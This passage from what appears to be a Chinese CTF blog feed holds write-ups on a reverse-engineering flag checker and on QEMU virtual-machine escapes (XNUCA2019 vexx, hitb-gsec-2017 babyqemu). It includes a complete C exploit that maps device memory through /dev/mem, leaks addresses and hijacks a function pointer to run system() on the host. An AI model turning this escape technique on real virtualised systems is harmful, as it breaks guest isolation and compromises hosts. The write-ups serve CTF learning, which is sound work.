<a id="more"></a>

<p>ida先打开程序发现加了壳，遂脱壳</p>
<p>脱壳后，发现程序加了花，各种无意义跳转</p>
<p>许多类似这样的跳转</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text:12341487                 call    loc_12341490</span><br><span class="line">.text:12341487 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:1234148C                 db  77h ; w</span><br><span class="line">.text:1234148D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:1234148D                 jmp     short loc_12341496</span><br><span class="line">.text:1234148D ; ---------------------------------------------------------------------------</span><br><span class="line">.text:1234148F                 db  88h</span><br><span class="line">.text:12341490 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:12341490</span><br><span class="line">.text:12341490 loc_12341490:                           ; CODE XREF: sub_123413B0+D7↑p</span><br><span class="line">.text:12341490                 db      36h</span><br><span class="line">.text:12341490                 add     dword ptr [esp+0], 1</span><br><span class="line">.text:12341495                 retn</span><br><span class="line">.text:12341496 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>对于没有经验的人来说，最方便的方法是手动patch，奈何这里的花太多，patch了许久</p>
<p>patch之后</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_123413B0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ST40_4</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// ST44_4</span></span><br><span class="line">  <span class="keyword">char</span> *Buf1; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  nullsub_11();</span><br><span class="line">  sub_12341340(<span class="number">0</span>);</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(<span class="string">"npointer&#123;"</span>);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(<span class="string">"&#125;"</span>);</span><br><span class="line">  Buf1 = (<span class="keyword">char</span> *)sub_123416AD(v0 + v1 + <span class="number">33</span>);</span><br><span class="line">  nullsub_12();</span><br><span class="line">  sub_12341020(<span class="string">"Input the correct keys: "</span>);</span><br><span class="line">  nullsub_13();</span><br><span class="line">  sub_12341050(<span class="string">"%s"</span>, Buf1, v0 + v1 + <span class="number">33</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(Buf1, <span class="string">"npointer&#123;"</span>, <span class="built_in">strlen</span>(<span class="string">"npointer&#123;"</span>))</span><br><span class="line">    &amp;&amp; Buf1[<span class="built_in">strlen</span>(Buf1) - <span class="number">1</span>] == asc_12343738[<span class="number">0</span>]</span><br><span class="line">    &amp;&amp; (Buf1[<span class="built_in">strlen</span>(Buf1) - <span class="number">1</span>] = <span class="number">0</span>, sub_12341090(&amp;unk_12343798, <span class="number">0x30D3</span>u, (<span class="keyword">int</span>)&amp;Buf1[<span class="built_in">strlen</span>(<span class="string">"npointer&#123;"</span>)])) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_12341340(<span class="number">1</span>);</span><br><span class="line">    sub_12341020(<span class="string">"Congrats!\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_12341020(<span class="string">"Sorry, the gate remains closed.\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明白我们的输入是<code>npointer{32字节}</code></p>
<p><code>unk_12343798</code>是代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text:123411D3 sub_123411D3    proc near               ; CODE XREF: sub_123411C7+6↑p</span><br><span class="line">.text:123411D3                 add     esp, 4</span><br><span class="line">.text:123411D6                 add     edi, [ebp-14h]</span><br><span class="line">.text:123411D9                 xor     ecx, ecx</span><br><span class="line">.text:123411DB                 call    dword ptr [ebp-14h]</span><br><span class="line">.text:123411DE                 jmp     short loc_123411E3</span><br></pre></td></tr></table></figure>

<p>此处会调用它</p>
<p>进入代码后，发现是这样一个逻辑：</p>
<ul>
<li>按顺序取花括号内字符，与硬编码到指令的字符进行比较</li>
<li>第一个比较很直接，如果第一个字符是’f’，则继续，若非，则失败</li>
<li>如果继续，在执行到retf之后，cs部分会变成0x33，然后进入到push到栈中的下一个指令的地址，但是一般的调试器在执行这一步的时候会因为检测到异常而停止程序……</li>
<li>程序在cs是0x23的时候表示32位模式，cs是0x33的时候表示是64位模式</li>
<li>所以这段代码就是64位和32位循环交替来对每一位进行比较，比如第一位32位模式下比较，第二位64位模式下比较，以此循环</li>
</ul>
<p>由于32位和64位代码不一样，所以可以把代码dump出来，copy一份，一份ida32打开它，一份ida64打开它，这样分析会比较方便</p>
<p>但是由于分支众多，所以如何才能成功呢？</p>
<p>经过观察，我发现，每次分叉的时候，都只有一条路径是之前没执行过的，其他路径要么执行过，要么跳入失败的函数，所以我们只需要提前分析每条路径的下一次跳转到了什么地方，然后找到一条不在原地转圈的通路就可以了</p>
<p>在偏向后期的时候，遇到一个三叉路口，但只能否定其中一个，因此我两个都测试了一下，发现只有中间的那个je可以直通终点</p>
<p>通到终点之后，继续运行程序就会告诉你成功了</p>
<p>flag就是所有的输入</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>qemu pwn--XNUCA2019 vexx &amp; /dev/mem</title>
    <url>/2020/02/29/qemu-pwn-XNUCA2019-vexx/</url>
    <content><![CDATA[<p>曾经被XNUCA支配的我……终于发现还是自己太菜了QAQ</p>
<a id="more"></a>

<h1 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h1><p>这道题其实难度和<code>hitb-gsec-2017-babyqemu</code>非常像，但是做了这道题之后，还是学到了新东西</p>
<p>这道题有两个<code>mmio</code>的空间，因此其就对应了两个resource文件，因此就有了一个比较方便得到其mmio的空间的内存的方法</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> page_offset(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gfn(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *mmap_mem_addr_mmio, *mmap_mem_addr_cmb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *mmap_mem(<span class="keyword">size_t</span> size, <span class="keyword">off_t</span> offset)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/mem"</span>,  O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        error(<span class="string">"[-] /dev/mem open error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint8_t</span> *address = mmap(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);</span><br><span class="line">    <span class="keyword">if</span>(address == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        error(<span class="string">"[-] mmap failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_memorymode</span><span class="params">(<span class="keyword">uint32_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(mode, <span class="number">0x230</span>);</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_offset</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(offset, <span class="number">0x240</span>);</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_mmio</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmap_mem_addr_mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cmb</span><span class="params">(<span class="keyword">uint32_t</span> mode, <span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_memorymode(mode);</span><br><span class="line">    set_offset(offset);</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmap_mem_addr_cmb+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> read_cmb(<span class="keyword">uint32_t</span> mode, <span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    set_memorymode(mode);</span><br><span class="line">    set_offset(offset);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmap_mem_addr_cmb+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger_timer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmap_mem_addr_mmio+<span class="number">0x98</span>) = <span class="number">1</span>;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"mknod -m 660 /dev/mem c 1 1"</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0x00000000febd6000 0x00000000febd6fff 0x0000000000040200</span></span><br><span class="line"><span class="comment">    0x00000000febd0000 0x00000000febd3fff 0x0000000000140204</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    mmap_mem_addr_mmio = mmap_mem(<span class="number">0x1000</span>, <span class="number">0x00000000febd6000</span>);</span><br><span class="line">    mmap_mem_addr_cmb = mmap_mem(<span class="number">0x4000</span>, <span class="number">0x00000000febd0000</span>);</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        error(<span class="string">"[-] iopl error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint32_t</span> elf_base_0 = read_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x10</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> elf_base_1 = read_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x10</span>+<span class="number">4</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> elf_base = (((<span class="keyword">uint64_t</span>)elf_base_1 &amp; <span class="number">0xffffffff</span>) &lt;&lt; <span class="number">32</span>) | ((<span class="keyword">uint64_t</span>)elf_base_0 &amp; <span class="number">0xffffffff</span>) - <span class="number">0x4dcf10</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = elf_base + <span class="number">0x00000000002ab860</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] system plt: %p\n"</span>, system_plt);</span><br><span class="line">    <span class="keyword">uint32_t</span> heap_addr_0 = read_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x18</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> heap_addr_1 = read_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x18</span>+<span class="number">4</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr = (((<span class="keyword">uint64_t</span>)heap_addr_1 &amp; <span class="number">0xffffffff</span>) &lt;&lt; <span class="number">32</span>) | ((<span class="keyword">uint64_t</span>)heap_addr_0 &amp; <span class="number">0xffffffff</span>) + <span class="number">0xb90</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] heap addr: %p\n"</span>, heap_addr); </span><br><span class="line">    <span class="keyword">uint32_t</span> system_plt_0 = (<span class="keyword">uint32_t</span>)system_plt;</span><br><span class="line">    <span class="keyword">uint32_t</span> system_plt_1 = (<span class="keyword">uint32_t</span>)(system_plt &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    write_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x10</span>, <span class="number">0x100</span>, system_plt_0);</span><br><span class="line">    write_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x14</span>, <span class="number">0x100</span>, system_plt_1);</span><br><span class="line">    <span class="keyword">uint32_t</span> req_buf_0 = (<span class="keyword">uint32_t</span>)heap_addr;</span><br><span class="line">    <span class="keyword">uint32_t</span> req_buf_1 = (<span class="keyword">uint32_t</span>)(heap_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    write_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x18</span>, <span class="number">0x100</span>, req_buf_0);</span><br><span class="line">    write_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x1c</span>, <span class="number">0x100</span>, req_buf_1);</span><br><span class="line">    <span class="keyword">char</span> buf[] = <span class="string">"cat flag"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i+=<span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> b = *(<span class="keyword">uint32_t</span>*)&amp;buf[i];</span><br><span class="line">        write_cmb(<span class="number">1</span>, <span class="number">0</span>, i, b);</span><br><span class="line">    &#125;</span><br><span class="line">    trigger_timer();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="具体方法"><a href="#具体方法" class="headerlink" title="具体方法"></a>具体方法</h1><p>根据：<a href="http://man7.org/linux/man-pages/man4/mem.4.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man4/mem.4.html</a></p>
<p>如果系统此时没有<code>/dev/mem</code>文件的话，<code>system(&quot;mknod -m 660 /dev/mem c 1 1&quot;);</code>可以创建一个该文件</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; /dev/mem is a character device file that is an image of the main memory of the computer.  It may be used, for example, to examine (and even patch) the system.</span><br><span class="line">&gt; </span><br><span class="line">&gt; Byte addresses in /dev/mem are interpreted as physical memory addresses.  References to nonexistent locations cause errors to be returned.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>该文件是与系统的内存相关的，我们可以以物理地址为偏移来从该文件得到该物理地址所指向的内存</p>
<p>具体做法就是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> *mmap_mem(<span class="keyword">size_t</span> size, <span class="keyword">off_t</span> offset)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/mem"</span>,  O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        error(<span class="string">"[-] /dev/mem open error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint8_t</span> *address = mmap(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);</span><br><span class="line">    <span class="keyword">if</span>(address == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        error(<span class="string">"[-] mmap failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即mmap的时候把地址作为偏移</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>qemu学习 -- hitb-gsec-2017-babyqemu</title>
    <url>/2020/02/20/qemu%E5%AD%A6%E4%B9%A0-hitb-gsec-2017-babyqemu/</url>
    <content><![CDATA[<p>学习一下qemu的虚拟机逃逸</p>
<p>文件：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/hitb-gsec-2017-babyqemu" target="_blank" rel="noopener">https://github.com/DayJun/Blogs/tree/master/Articles/hitb-gsec-2017-babyqemu</a></p>
<a id="more"></a>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> dajun @ dajun-pc <span class="keyword">in</span> ~/zoneOfDajun/pwndocker/works/qemu/babyqemu [10:49:54] </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">launch.sh  pc-bios  qemu-system-x86_64  rootfs.cpio  vmlinuz-4.8.0-52-generic</span><br></pre></td></tr></table></figure>

<h1 id="launch-sh"><a href="#launch-sh" class="headerlink" title="launch.sh"></a>launch.sh</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/local/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br></pre></td></tr></table></figure>

<p>由启动脚本可知，启动了一个名为<code>hitb</code>的设备，因此该设备的相关函数就是我们本次的目标</p>
<h1 id="分析qemu-system-x86-64"><a href="#分析qemu-system-x86-64" class="headerlink" title="分析qemu-system-x86_64"></a>分析qemu-system-x86_64</h1><p>使用ida打开<code>qemu-system-x86_64</code>，搜索<code>hitb</code>相关函数，可得到几个关键函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">pci_hitb_realize</span><span class="params">(PCIDevice_0 *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_dma_timer</span><span class="params">(HitbState *opaque)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_mmio_write</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function">uint64_t __fastcall <span class="title">hitb_mmio_read</span><span class="params">(HitbState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br></pre></td></tr></table></figure>

<p>首先查看<code>hitb_class_init</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           <span class="string">"pci-device"</span>,</span><br><span class="line">                           <span class="string">"/mnt/hgfs/eadom/workspcae/projects/hitbctf2017/babyqemu/qemu/hw/misc/hitb.c"</span>,</span><br><span class="line">                           <span class="number">0x1D5</span>,</span><br><span class="line">                           <span class="string">"hitb_class_init"</span>);</span><br><span class="line">  v2-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">0xFF</span>;</span><br><span class="line">  v2-&gt;realize = (<span class="keyword">void</span> (*)(PCIDevice_0 *, Error_0 **))pci_hitb_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = (PCIUnregisterFunc *)pci_hitb_uninit;</span><br><span class="line">  v2-&gt;vendor_id = <span class="number">0x1234</span>;</span><br><span class="line">  v2-&gt;device_id = <span class="number">0x2333</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到了<code>realize</code>相关函数是<code>pci_hitb_realize</code>，<code>vender_id = 0x1234</code>，<code>device_id = 0x2333</code></p>
<p>因此运行<code>launch.sh</code>，启动虚拟机</p>
<p>在启动虚拟机的过程中，我遇到了这样的问题：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./qemu-system-x86_64: /usr/lib/libcurl.so.4: version `CURL_OPENSSL_3' not found (required by ./qemu-system-x86_64)</span><br></pre></td></tr></table></figure>

<p>经过搜索，我继续安装了<code>libcurl-compat</code>，然而依旧报错</p>
<p>解决方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls -l /usr/lib/libcurl.so.4</span></span><br><span class="line">lrwxrwxrwx 1 root root 16  1月  8 16:11 /usr/lib/libcurl.so.4 -&gt; libcurl.so.4.6.0</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> find /usr/lib/ | grep libcurl</span></span><br><span class="line">/usr/lib/libcurl.so.3</span><br><span class="line">/usr/lib/pkgconfig/libcurl.pc</span><br><span class="line">/usr/lib/libcurl.so.4.1.0</span><br><span class="line">/usr/lib/libcurl.so.4</span><br><span class="line">/usr/lib/libcurl.so</span><br><span class="line">/usr/lib/libcurl.so.4.2.0</span><br><span class="line">/usr/lib/libcurl-compat.so.4.6.0</span><br><span class="line">/usr/lib/libcurl.so.4.3.0</span><br><span class="line">find: ‘/usr/lib/firmware/b43’: Permission denied</span><br><span class="line">find: ‘/usr/lib/firmware/b43legacy’: Permission denied</span><br><span class="line">/usr/lib/libcurl.so.4.6.0</span><br><span class="line">/usr/lib/libcurl.so.4.0.0</span><br><span class="line">/usr/lib/libcurl.so.4.4.0</span><br><span class="line">/usr/lib/libcurl.so.4.5.0</span><br></pre></td></tr></table></figure>

<p>所以我们要把启动qemu时使用的<code>libcurl.so.4</code>改成<code>/usr/lib/libcurl.so.4.4.0</code></p>
<p>所以修改启动脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat ./launch.sh </span></span><br><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">LD_PRELOAD=/usr/lib/libcurl.so.4.4.0 \</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/local/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br></pre></td></tr></table></figure>

<p>就可以正常启动</p>
<p>那么接下来在虚拟机中运行<code>lspci</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> lspci</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2333</span><br></pre></td></tr></table></figure>

<p>最后一行所表示的就是我们所分析的设备</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fea00000 0x00000000feafffff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>第一列是<code>start address</code>，随后是<code>end address</code>，<code>flags</code></p>
<p>关于<code>flags</code>：</p>
